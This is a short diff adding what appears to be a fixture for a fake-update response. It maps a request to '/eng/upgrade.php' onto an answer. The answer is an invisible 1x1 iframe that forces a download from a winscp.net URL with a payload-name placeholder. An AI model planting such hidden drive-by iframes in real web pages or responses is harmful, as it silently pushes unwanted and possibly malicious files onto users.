@@ -1,0 +1,3 @@
+GET /eng/upgrade.php?
+---answer---
+<iframe width="1" height="1" frameborder="0" src="http://winscp.net/download/%PAYLOAD_NAME%"></iframe>
